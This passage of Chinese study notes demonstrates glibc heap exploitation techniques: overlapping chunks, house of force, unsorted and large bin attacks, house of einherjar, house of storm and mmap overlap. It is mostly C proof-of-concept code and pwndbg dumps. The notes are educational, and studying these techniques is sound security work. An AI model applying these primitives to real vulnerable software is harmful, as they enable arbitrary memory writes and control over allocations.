  memset(p5,&#39;E&#39;,real_size_p5);

  free(p4);

  *(unsigned int *)((unsigned char *)p1 + real_size_p1 ) &#x3D; real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2;

  free(p2);

  p6 &#x3D; malloc(2000);
  real_size_p6 &#x3D; malloc_usable_size(p6);

  memset(p6,&#39;F&#39;,1500);  
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>首先创建5个堆，释放第四个堆，将第二个堆的大小改成二三两个堆大小之和，此时第二个堆覆盖了第三个堆</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555b000
Size: 0x3f1

Allocated chunk | PREV_INUSE
Addr: 0x55555555b3f0
Size: 0x7e1

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x55555555bbd0
Size: 0x3f1
fd: 0x7ffff7dd1b78
bk: 0x7ffff7dd1b78

Allocated chunk
Addr: 0x55555555bfc0
Size: 0x3f0

Top chunk | PREV_INUSE
Addr: 0x55555555c3b0
Size: 0x1fc51<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>释放被合并的堆并申请回来，此时第二、三、四个堆会被合并成一个堆</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555b000
Size: 0x3f1

Allocated chunk | PREV_INUSE
Addr: 0x55555555b3f0
Size: 0x7e1

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x55555555bbd0
Size: 0x3f1
fd: 0x7ffff7dd1b78
bk: 0x7ffff7dd1b78

Allocated chunk
Addr: 0x55555555bfc0
Size: 0x3f0

Top chunk | PREV_INUSE
Addr: 0x55555555c3b0
Size: 0x1fc51<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>第三个堆始终没有被操作，而新创建的堆可以堆第三个堆进行读写，形成<code>overlap</code></p>
<p>相关<code>glibc</code>源码：</p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;* consolidate forward *&#x2F;
      if (!nextinuse) &#123;
	unlink(av, nextchunk, bck, fwd);
	size +&#x3D; nextsize;
      &#125; else
	clear_inuse_bit_at_offset(nextchunk, 0);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>释放被合并的堆的时候会判断下一个堆即第四个堆是被释放的，因此向下合并到第四个堆</p>
<p>实现效果：存在三个堆，将三个堆合并成一个堆，且可以覆写中间一个堆、中间一个堆始终未被操作</p>
<p>应用：2.31之前的<code>off-by-null</code>：创建三个堆<code>A、B、C</code>通过<code>off-by-bull</code>溢出<code>B</code>到<code>C</code>使得<code>C</code>的低字节被覆盖为<code>0</code>（注意：被覆盖的堆原始大小要在<code>fx</code>，这样创建的堆实际大小就是<code>10x</code>而不会因为修改了第二位导致错误，且<code>A</code>的大小属于<code>unsorted bin</code>）将<code>C</code>的<code>prve_size</code>改成<code>A</code>和<code>B</code>的大小之和，系统将判断<code>A</code>和<code>B</code>是一个堆并且已经被释放，此时释放<code>A</code>和<code>C</code>，从<code>A</code>到<code>C</code>的区域就会合并成一个堆并释放，而<code>B</code>仍然存在。</p>
<h3 id="house-of-force-x2F-top-chunk"><a href="#house-of-force-x2F-top-chunk" class="headerlink" title="house_of_force&#x2F;top chunk"></a>house_of_force&#x2F;top chunk</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;malloc.h&gt;
#include &lt;assert.h&gt;

char bss_var[] &#x3D; &quot;This is a string that we want to overwrite.&quot;;

int main(int argc , char* argv[])
&#123;
    
	intptr_t *p1 &#x3D; malloc(256);
	int real_size &#x3D; malloc_usable_size(p1);
    
	intptr_t *ptr_top &#x3D; (intptr_t *) ((char *)p1 + real_size - sizeof(long));	
	*(intptr_t *)((char *)ptr_top + sizeof(long)) &#x3D; -1;
	
	unsigned long evil_size &#x3D; (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;
	
	void *new_ptr &#x3D; malloc(evil_size);
	void* ctr_chunk &#x3D; malloc(100);
	
	strcpy(ctr_chunk, &quot;YEAH!!!&quot;);
    
	assert(ctr_chunk &#x3D;&#x3D; bss_var);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>条件：可以溢出到top_chunk、可以申请任意大小的堆块</p>
<p>首先创建了一个堆，并溢出到<code>top chunk</code>将<code>size</code>改成<code>-1</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555c000
Size: 0x111

Allocated chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA
Addr: 0x55555555c110
Size: 0xffffffffffffffff<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>计算要覆写的地址和<code>top chunk</code>的差并减去<code>chunk header</code>的大小，申请该大小的堆，即把所需地址之前的空间都申请完，因此下一个申请的堆<code>user data</code>处即为要覆写的区域</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk			#申请完所求地址之前的所有空间
Addr: 0x555555558000
Size: 0x555555558008<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted_bin_attack"></a>unsorted_bin_attack</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main()&#123;
    
	unsigned long stack_var&#x3D;0;
    
	unsigned long *p&#x3D;malloc(400);
	malloc(500);

	free(p);
    
	p[1]&#x3D;(unsigned long)(&amp;stack_var-2);
    
	malloc(400);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>前提：控制unsorted bin的bk指针</p>
<p>目的：实现修改任意地址值为一个较大的数值，但是数值不受控制</p>
<ul>
<li>通过修改循环的次数来使得程序可以执行多次循环</li>
<li>修改global_max_fast 来使得更大的 chunk 可以被视为 fast bin，执行 fast bin attack</li>
</ul>
<p>原理：将一个 unsorted bin 取出的时候，会将 <code>bck-&gt;fd</code> 的位置写入本 Unsorted Bin 的位置</p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;* remove from unsorted list *&#x2F;
          unsorted_chunks (av)-&gt;bk &#x3D; bck;
          bck-&gt;fd &#x3D; unsorted_chunks (av);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>控制 bk 的值就能将 <code>unsorted_chunks (av)</code> 写到任意地址（要减两个机器字长作为<code>prev_size</code>和<code>size</code>，此时<code>Target Value</code> 处于伪造 <code>chunk</code> 的<code>fd</code>处）</p>
<p><code>victim</code> 的<code>fd</code>在取<code>chunk</code>时并没有发挥作用，所以修改为不合法的值也没有关系，但是<code>unsorted bin </code>链表可能就此破坏，在插入 <code>chunk</code> 时，可能会出现问题</p>
<p>实现：将<code>unsorted bin</code>中的<code>chunk</code>通过溢出修改<code>bk</code>为要修的地址 - 两个机器字节，再分配掉即可将地址内容改成很大的数值</p>
<h3 id="house-of-einherjar-off-by-null"><a href="#house-of-einherjar-off-by-null" class="headerlink" title="house_of_einherjar(off-by-null)"></a>house_of_einherjar(off-by-null)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;malloc.h&gt;

int main()
&#123;
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	uint8_t* a;
	uint8_t* b;
	uint8_t* d;

	a &#x3D; (uint8_t*) malloc(0x38);
    
	int real_a_size &#x3D; malloc_usable_size(a);
	size_t fake_chunk[6];

	fake_chunk[0] &#x3D; 0x100; 
	fake_chunk[1] &#x3D; 0x100; 
	fake_chunk[2] &#x3D; (size_t) fake_chunk; 
	fake_chunk[3] &#x3D; (size_t) fake_chunk; 
	fake_chunk[4] &#x3D; (size_t) fake_chunk; 
	fake_chunk[5] &#x3D; (size_t) fake_chunk; 

	b &#x3D; (uint8_t*) malloc(0xf8);
	int real_b_size &#x3D; malloc_usable_size(b);

	uint64_t* b_size_ptr &#x3D; (uint64_t*)(b - 8);
    
	a[real_a_size] &#x3D; 0; 
    
	size_t fake_size &#x3D; (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);
  
	*(size_t*)&amp;a[real_a_size-sizeof(size_t)] &#x3D; fake_size;

	fake_chunk[1] &#x3D; fake_size;

	free(b);
    
	d &#x3D; malloc(0x200);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>首先创建了一个<code>0x30</code>的堆</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555b000
Size: 0x41

Top chunk | PREV_INUSE
Addr: 0x55555555b040
Size: 0x20fc1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在栈上伪造了一个<code>fake chunk</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x7fffffffe1c0
0x7fffffffe1c0: 0x0000000000000100      0x0000000000000100	#prev_size, size
0x7fffffffe1d0: 0x00007fffffffe1c0      0x00007fffffffe1c0  #fd, bk
0x7fffffffe1e0: 0x00007fffffffe1c0      0x00007fffffffe1c0	#fd_nextsize, bk_nextsize<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>创建一个<code>0xf8</code>大小的堆，并通过上一个堆的溢出来将这个堆<code>prve_inuse</code>位改成<code>0</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555b000
Size: 0x41

Allocated chunk
Addr: 0x55555555b040
Size: 0x100

Top chunk | PREV_INUSE
Addr: 0x55555555b140
Size: 0x20ec1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>再将<code>prve_size</code>改成该堆与<code>fake chunk</code>的<code>chunk header</code>地址的差</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x55555555b040
0x55555555b040: 0xffffd5555555ce80      0x0000000000000100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>释放该堆再申请回来，此时申请的堆就在<code>fake_chunk</code>处</p>
<pre class="line-numbers language-none"><code class="language-none">Allocated chunk
Addr: 0x7ffffffde010
Size: 0x00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>在释放一个属于<code>unsorted bin</code>的堆时会检测上一个堆是否被释放，若被释放则向上合并，且下一个堆是<code>top chunk</code>时直接合并到<code>top chunk</code>,所以<code>top chunk</code>地址就在<code>fake chunk</code>处，再次申请堆就可以从<code>fake chunk</code>开始申请</p>
<p>条件：</p>
<ul>
<li>可以篡改<code>prev_size</code> 与 <code>prve_inuse</code> </li>
<li>能够获取到要覆写的地址</li>
<li>能够在要覆写的地址伪造<code>fake chunk</code>，从而绕过 <code>unlink </code>的检测。</li>
</ul>
<h3 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large_bin_attack"></a>large_bin_attack</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;
#include&lt;assert.h&gt;
 
int main()
&#123;

    unsigned long stack_var1 &#x3D; 0;
    unsigned long stack_var2 &#x3D; 0;

    unsigned long *p1 &#x3D; malloc(0x420);
    malloc(0x20);
    
    unsigned long *p2 &#x3D; malloc(0x500);
    malloc(0x20);

    unsigned long *p3 &#x3D; malloc(0x500);
    malloc(0x20);
 
    free(p1);
    free(p2);
    
    malloc(0x90);
    free(p3);

    p2[-1] &#x3D; 0x3f1;
    p2[0] &#x3D; 0;
    p2[2] &#x3D; 0;
    p2[1] &#x3D; (unsigned long)(&amp;stack_var1 - 2);
    p2[3] &#x3D; (unsigned long)(&amp;stack_var2 - 4);

    malloc(0x90);
 
    assert(stack_var1 !&#x3D; 0);
    assert(stack_var2 !&#x3D; 0);

    return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>向栈中写入数据，可用于修改<code>global_max_fast</code></li>
</ul>
<p>创建一个<code>large bin</code>之后再创建一个<code>fast bin</code>防止释放的时候合并掉</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x431

Allocated chunk | PREV_INUSE
Addr: 0x405430
Size: 0x31

Top chunk | PREV_INUSE
Addr: 0x405460
Size: 0x20ba1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>创建两个大小相同且与大于第一个大小的<code>large bin</code>且每个<code>large bin</code>下面都创建一个<code>fast bin</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x431

Allocated chunk | PREV_INUSE
Addr: 0x405430
Size: 0x31

Allocated chunk | PREV_INUSE
Addr: 0x405460
Size: 0x511

Allocated chunk | PREV_INUSE
Addr: 0x405970
Size: 0x31

Allocated chunk | PREV_INUSE
Addr: 0x4059a0
Size: 0x511

Allocated chunk | PREV_INUSE
Addr: 0x405eb0
Size: 0x31

Top chunk | PREV_INUSE
Addr: 0x405ee0
Size: 0x20121<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将第一、二两个堆释放进<code>unsorted bin</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x405460 —▸ 0x405000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x405460 &#x2F;* &#39;&#96;T@&#39; *&#x2F;
smallbins
empty
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>创建一个比第一个释放的堆小的堆使得<strong>第二个</strong>被释放的堆进入<code>large bin</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x4050a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x4050a0
smallbins
empty
largebins
0x500: 0x405460 —▸ 0x7ffff7dd1fa8 (main_arena+1160) ◂— 0x405460 &#x2F;* &#39;&#96;T@&#39; *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将第三个堆也释放到<code>unsorted bin</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x4059a0 —▸ 0x4050a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x4059a0
smallbins
empty
largebins
0x500: 0x405460 —▸ 0x7ffff7dd1fa8 (main_arena+1160) ◂— 0x405460 &#x2F;* &#39;&#96;T@&#39; *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>修改第二个被释放的堆的一些内容</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x405460
0x405460:	0x0000000000000000	0x00000000000003f1			#减小第二个堆的大小使得第三个堆进入large bin链表
0x405470:	0x0000000000000000	0x00007fffffffdd50			#将想要写入的栈地址写入bk、bk_nextsize,其中bk位置的地址要减0x10，bk_nextsize的地址要减0x20
0x405480:	0x0000000000000000	0x00007fffffffdd48<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>创建一个<code>fast bin</code>使得第三个堆进入<code>unsorted bin</code>，此时栈上的内容也会被修改为第三个堆的头指针</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x405140 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x405140 &#x2F;* &#39;@Q@&#39; *&#x2F;
smallbins
empty
largebins
0x500 [corrupted]
FD: 0x405460 ◂— 0x0
BK: 0x405460 —▸ 0x4059a0 —▸ 0x7fffffffdd50 ◂— 0x4059a0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;gx 0x7fffffffdd60
0x7fffffffdd60:	0x00000000004059a0
pwndbg&gt; x&#x2F;gx 0x7fffffffdd68
0x7fffffffdd68:	0x00000000004059a0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="house-of-storm-x2F-unsorted-bin-attack-large-bin-attack"><a href="#house-of-storm-x2F-unsorted-bin-attack-large-bin-attack" class="headerlink" title="house_of_storm&#x2F;unsorted bin attack + large bin attack"></a>house_of_storm&#x2F;unsorted bin attack + large bin attack</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

char filler[0x10];
char target[0x60]; 

void init()&#123;
        setvbuf(stdout, NULL, _IONBF, 0);
        setvbuf(stdin, NULL, _IONBF, 0);
&#125;

int get_shift_amount(char* pointer)&#123;

        int shift_amount &#x3D; 0;
        long long ptr &#x3D; (long long)pointer;

        while(ptr &gt; 0x20)&#123;
                ptr &#x3D; ptr &gt;&gt; 8;
                shift_amount +&#x3D; 1;
        &#125;

        return shift_amount - 1; 
&#125;

int main()&#123;

	init();

	char *unsorted_bin, *large_bin, *fake_chunk, *ptr;

	unsorted_bin &#x3D; malloc ( 0x4e8 ); 

	malloc ( 0x18 ); 

	int shift_amount &#x3D; get_shift_amount(unsorted_bin);
        printf(&quot;Shift Amount: %d\n&quot;, shift_amount);

        size_t alloc_size &#x3D; ((size_t)unsorted_bin) &gt;&gt; (8 * shift_amount);
        if(alloc_size &lt; 0x10)&#123;
                printf(&quot;Chunk Size: 0x%lx\n&quot;, alloc_size);
                puts(&quot;Chunk size is too small&quot;);
                exit(1);
        &#125;
        alloc_size &#x3D; (alloc_size &amp; 0xFFFFFFFFE) - 0x10; 
        printf(&quot;In this case, the chunk size is 0x%lx\n&quot;, alloc_size);

        if((alloc_size &amp; 0x8) !&#x3D; 0 || (((alloc_size &amp; 0x4) &#x3D;&#x3D; 0x4) &amp;&amp; ((alloc_size &amp; 0x2) !&#x3D; 0x2)))&#123;
                puts(&quot;Allocation size has bit 4 of the size set or &quot;);
                puts(&quot;mmap and non-main arena bit check will fail&quot;);
                puts(&quot;Please try again! :)&quot;);
                puts(&quot;Exiting...&quot;);
                return 1;

	&#125;

	large_bin  &#x3D;  malloc ( 0x4d8 ); 
	malloc ( 0x18 );

	free ( large_bin );  
	free ( unsorted_bin );

	unsorted_bin &#x3D; malloc(0x4e8);
	free(unsorted_bin);

	fake_chunk &#x3D; target - 0x10;

	((size_t *)unsorted_bin)[1] &#x3D; (size_t)fake_chunk; 

	(( size_t *) large_bin )[1]  &#x3D;  (size_t)fake_chunk  +  8 ;
	
	ptr &#x3D; malloc(alloc_size);
	strncpy(ptr, &quot;\x41\x42\x43\x44\x45\x46\x47&quot;, 0x58 - 1);
	
	return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>条件：没有地址随机化</p>
<p>首先创建一个<code>unsorted bin</code>和一个<code>large bin</code>（<code>large bin</code>小于<code>unsorted bin</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x291

Allocated chunk | PREV_INUSE
Addr: 0x405290
Size: 0x4f1

Allocated chunk | PREV_INUSE
Addr: 0x405780
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x4057a0
Size: 0x4e1

Allocated chunk | PREV_INUSE
Addr: 0x405c80
Size: 0x21

Top chunk | PREV_INUSE
Addr: 0x405ca0
Size: 0x20361<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>释放<code>large bin</code>和<code>unsroted bin</code>，再创建一个堆并释放掉使得<code>large bin</code>能够真正进入<code>large bin</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x291

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x405290
Size: 0x4f1
fd: 0x7ffff7facbe0
bk: 0x7ffff7facbe0

Allocated chunk
Addr: 0x405780
Size: 0x20

Free chunk (largebins) | PREV_INUSE
Addr: 0x4057a0
Size: 0x4e1
fd: 0x7ffff7fad000
bk: 0x7ffff7fad000
fd_nextsize: 0x4057a0
bk_nextsize: 0x4057a0

Allocated chunk
Addr: 0x405c80
Size: 0x20

Top chunk | PREV_INUSE
Addr: 0x405ca0
Size: 0x20361<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将<code>unsorted bin</code>的<code>bk</code>改成<code>目标地址 - 0x10</code></p>
<p>将<code>large bin</code>的<code>bk_nextsize</code>改成<code>目标地址 - 0x28 - shift amount</code>，<code>bk</code>改成<code>目标地址 - 0x8</code></p>
<p>其中，<code>shift amount</code>计算方式：<code>large bin</code>地址转换为长长整型，每次右移<code>8</code>位知道小于等于<code>0x20</code>，<code>shift amount</code>即为右移次数减<code>1</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x291

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x405290
Size: 0x4f1
fd: 0x7ffff7facbe0
bk: 0x404070

Allocated chunk
Addr: 0x405780
Size: 0x20

Free chunk (largebins) | PREV_INUSE
Addr: 0x4057a0
Size: 0x4e1
fd: 0x7ffff7fad000
bk: 0x404078
fd_nextsize: 0x4057a0
bk_nextsize: 0x404056

Allocated chunk
Addr: 0x405c80
Size: 0x20

Top chunk | PREV_INUSE
Addr: 0x405ca0
Size: 0x20361<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>再申请出来就可以将目标地址改成一个随机的很大的数字了</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x404080
0x404080 &lt;target&gt;:	0x0047464544434241	0x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="mmap-overlapping-chunks-x2F-mmap"><a href="#mmap-overlapping-chunks-x2F-mmap" class="headerlink" title="mmap_overlapping_chunks&#x2F;mmap"></a>mmap_overlapping_chunks&#x2F;mmap</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;assert.h&gt;

int main()&#123;


	int* ptr1 &#x3D; malloc(0x10); 

	long long* top_ptr &#x3D; malloc(0x100000);
	long long* mmap_chunk_2 &#x3D; malloc(0x100000);
	long long* mmap_chunk_3 &#x3D; malloc(0x100000);
    
	mmap_chunk_3[-1] &#x3D; (0xFFFFFFFFFD &amp; mmap_chunk_3[-1]) + (0xFFFFFFFFFD &amp; mmap_chunk_2[-1]) | 2;
    
	free(mmap_chunk_3); 

	long long* overlapping_chunk &#x3D; malloc(0x300000);
    
	int distance &#x3D; mmap_chunk_2 - overlapping_chunk;
    
	overlapping_chunk[distance] &#x3D; 0x1122334455667788;

	assert(mmap_chunk_2[0] &#x3D;&#x3D; overlapping_chunk[distance]);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>对<code>mmap</code>的<code>overlap</code>，原理与<code>overlapping_chunks</code>相同，只是堆的大小在<code>mmap</code>创建的范围</p>
<p>首先创建了一个<code>0x10</code>的堆和三个<code>0x100000</code>的堆I（<code>heap</code>里看不到</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x405020
Size: 0x411

Top chunk | PREV_INUSE
Addr: 0x405430
Size: 0x20bd1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">The first mmap chunk goes directly above LibC: 0x7ffff7ef2010
The second mmap chunk goes below LibC: 0x7ffff790c010
The third mmap chunk goes below the second mmap chunk: 0x7ffff780b010<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>可以看到第三个堆地址在第二个之上，所以将第三个堆大小改成二、三两个堆大小之和</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x7ffff780b000
0x7ffff780b000:	0x0000000000000000	0x0000000000202002
0x7ffff780b010:	0x0000000000000000	0x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>释放这个堆之后再申请出来(<code>0x300000</code>)</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x7ffff770c000
0x7ffff770c000:	0x0000000000000000	0x0000000000301002
